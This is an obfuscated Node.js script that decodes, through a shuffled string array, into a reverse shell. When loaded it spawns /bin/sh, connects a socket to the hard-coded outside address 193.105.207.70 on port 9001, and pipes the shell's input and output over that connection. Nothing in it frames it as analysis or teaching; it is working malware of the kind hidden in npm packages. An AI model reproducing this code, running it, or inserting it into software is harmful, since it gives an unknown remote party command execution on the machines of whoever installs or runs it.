function _0x36f3() {
    var _0x4e3f4b = [
        '486iNsyuM',
        '3441752dQKwvs',
        '4028120HvpdFb',
        '1992thmECn',
        '24878SMnCnR',
        '1007632sVoRRC',
        '18sXjftP',
        '12180980evQCHr',
        'net',
        'spawn',
        'Socket',
        'connect',
        '193.105.207.70',
        'stdin',
        'pipe',
        '63903Bcahpz',
        '14946lphCfH'
    ];
    _0x36f3 = function () {
        return _0x4e3f4b;
    };
    return _0x36f3();
}
(function (_0x1091c0, _0x1c98d8) {
    var _0x41a9b7 = _0xa97c;
    var _0x4e2e59 = _0x1091c0();
    while (!![]) {
        try {
            var _0x5ee531 = -parseInt(_0x41a9b7(0x0)) / 0x1 + -parseInt(_0x41a9b7(0x1)) / 0x2 * (parseInt(_0x41a9b7(0x2)) / 0x3) + -parseInt(_0x41a9b7(0x3)) / 0x4 + -parseInt(_0x41a9b7(0x4)) / 0x5 + parseInt(_0x41a9b7(0x5)) / 0x6 * (parseInt(_0x41a9b7(0x6)) / 0x7) + parseInt(_0x41a9b7(0x7)) / 0x8 + parseInt(_0x41a9b7(0x8)) / 0x9 * (parseInt(_0x41a9b7(0x9)) / 0xa);
            if (_0x5ee531 === _0x1c98d8) {
                break;
            } else {
                _0x4e2e59['push'](_0x4e2e59['shift']());
            }
        } catch (_0x1c8743) {
            _0x4e2e59['push'](_0x4e2e59['shift']());
        }
    }
}(_0x36f3, 0xc3acf));
function _0xa97c(_0x4a929d, _0x36f3e3) {
    var _0xa97c8a = _0x36f3();
    _0xa97c = function (_0x28d371, _0x23aaa7) {
        _0x28d371 = _0x28d371 - 0x0;
        var _0x1ce402 = _0xa97c8a[_0x28d371];
        return _0x1ce402;
    };
    return _0xa97c(_0x4a929d, _0x36f3e3);
}
(function () {
    var _0x2c61c5 = _0xa97c;
    var _0xb8b770 = require(_0x2c61c5(0xa)), _0x52825f = require('child_process'), _0x30814f = _0x52825f[_0x2c61c5(0xb)]('/bin/sh', []);
    var _0x324a4d = new _0xb8b770[(_0x2c61c5(0xc))]();
    _0x324a4d[_0x2c61c5(0xd)](0x2329, _0x2c61c5(0xe), function () {
        var _0x4c5dfa = _0xa97c;
        _0x324a4d['pipe'](_0x30814f[_0x4c5dfa(0xf)]);
        _0x30814f['stdout']['pipe'](_0x324a4d);
        _0x30814f['stderr'][_0x4c5dfa(0x10)](_0x324a4d);
    });
    return /a/;
}());
